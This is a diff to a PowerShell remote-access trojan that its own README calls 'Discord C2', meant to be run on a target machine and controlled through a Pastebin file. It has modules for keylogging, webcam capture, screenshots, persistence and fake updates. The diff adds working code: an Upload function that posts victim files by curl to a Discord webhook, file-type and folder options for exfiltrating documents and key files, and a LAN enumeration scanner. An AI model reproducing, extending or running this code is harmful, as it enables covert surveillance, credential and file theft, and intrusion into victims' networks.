@@ -11,15 +11,15 @@ Every 10 seconds it will check a file for a change in the file contents and inte
 
 SETUP
 1. Goto https://pastebin.com and make an account..
-2. create an empty paste/file and copy the RAW url.
-3. change YOUR_FILE_URL to the RAW url  eg. https://pastebin.com/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
-4. change YOUR_WEBHOOK_URL to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+2. Create an empty paste/file and copy the RAW url.
+3. Change YOUR_FILE_URL to the RAW url  eg. https://pastebin.com/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
+4. Change YOUR_WEBHOOK_URL to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
 
 USAGE
 1. Setup the script
 2. Run the script on a target.
 3. Check discord for 'waiting to connect..' message.
-4. Save the contents of your hosted file to contain 'options' to get a list of modules
+4. Edit the contents of your hosted file to contain 'options' to get a list of modules
 5. Do the same with any other command listed - To run that module.
 
 MODULES
@@ -53,17 +53,16 @@ $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``WAITING FOR
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 
 Function Options{
-
 $msgsys = "``========================================================
 ================== Discord C2 Options ==================
 ========================================================
 = Commands List -                                      =
 ========================================================
-= Close  : Close this Session                          =
 = Message : Send a message window to the User          =
 = Screenshot  : Sends a screenshot of the desktop      =
 = Keycapture   : Capture Keystrokes and send           =
 = Exfiltrate : Send various files.                     =
+= Upload : Upload a file. eg. upload <pth/to/file>     =
 = Systeminfo : Send System info as text file.          =
 = TakePicture : Send a webcam picture.                 =
 = FolderTree : Save folder trees to file and send.     =
@@ -73,6 +72,8 @@ $msgsys = "``========================================================
 = CustomCommand : Execute a github file as a script.   =
 = IsAdmin  : Check if the session is admin             =
 = AttemptElevate : Attempt to restart script as admin  =
+= EnumerateLAN  : Show all devices on the network      =
+= Close  : Close this Session                          =
 ========================================================
 = Examples and Info -                                  =
 ========================================================
@@ -81,6 +82,35 @@ $msgsys = "``========================================================
 = the word 'False'. changing this word will exit       =
 = the script.                                          =
 ========================================================``"
+$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function ExtraInfo{
+$msgsys = "``=========  Exfiltrate Command Examples ==================
+= ( PS`> Exfiltrate -Path Documents -Filetype png )     =
+= ( PS`> Exfiltrate -Filetype log )                     =
+= ( PS`> Exfiltrate )                                   =
+= Exfiltrate only will send many pre-defined filetypes  =
+= from all User Folders like Documents, Downloads etc.. =
+= ----------------------------------------------------- =
+= PATH                                                  =
+= Documents, Desktop, Downloads,                        =
+= OneDrive, Pictures, Videos.                           =
+= FILETYPE                                              =
+= log, db, txt, doc, pdf, jpg, jpeg, png,               =
+= wdoc, xdoc, cer, key, xls, xlsx,                      =
+= cfg, conf, docx, rft.                                 =
+===================  Upload Command Example =============
+= ( PS`> Upload -Path C:/Path/To/File.txt )             =
+= Use 'Folder-Tree' command to show all files           =
+=================  Enumerate-LAN Example ================
+( PS`> Enumerate-LAN -Prefix 192.168.1. )               =
+This Eg. will scan 192.168.1.1 to 192.168.1.254         =
+==================  Message Example =====================
+( PS`> Message 'Your Message Here!' )                   =
+=========================================================``"
 $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
@@ -104,6 +134,23 @@ $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclock
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
 
+Function Upload{
+param ([string[]]$Path)
+if (Test-Path -Path $path){
+    $extension = [System.IO.Path]::GetExtension($path)
+    if ($extension -eq ".exe" -or $extension -eq ".msi") {
+        $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
+        curl.exe -F file1=@"$tempZipFilePath" $hookurl
+        sleep 1
+        Rm -Path $tempZipFilePath -Recurse -Force
+    }else{
+        curl.exe -F file1=@"$Path" $hookurl
+    }
+}
+}
+
 Function FakeUpdate {
 $tobat = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
@@ -120,6 +167,43 @@ sleep 3
 Remove-Item -Path $pth -Force
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function EnumerateLAN{
+param ([string]$Prefix)
+if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
+$FileOut = "$env:temp\Computers.csv"
+1..255 | ForEach-Object {
+    $ipAddress = "$Prefix.$_"
+    Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $ipAddress"
+    }
+$Computers = (arp.exe -a | Select-String "$Prefix.*dynam") -replace ' +', ',' |
+             ConvertFrom-Csv -Header Computername, IPv4, MAC, x, Vendor |
+             Select-Object IPv4, MAC
+$Computers | Export-Csv $FileOut -NoTypeInformation
+$data = Import-Csv $FileOut
+$data | ForEach-Object {
+    $mac = $_.'MAC'
+    $apiUrl = "https://api.macvendors.com/$mac"
+    $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
+    Start-Sleep -Seconds 1
+    $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
+    }
+$data | Export-Csv $FileOut -NoTypeInformation
+$data | ForEach-Object {
+    try {
+        $ip = $_.'IPv4'
+        $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
+        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
+    } 
+    catch {
+        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)"  
+    }
+}
+$data | Export-Csv $FileOut -NoTypeInformation
+$results = Get-Content -Path $FileOut -Raw
+Write-Output "$results"
+rm -Path $FileOut
 }
 
 Function AddPersistance{
@@ -153,6 +237,7 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 }
 
 Function Exfiltrate {
+param ([string[]]$FileType,[string[]]$Path)
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Started..`` :file_folder:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $maxZipFileSize = 25MB
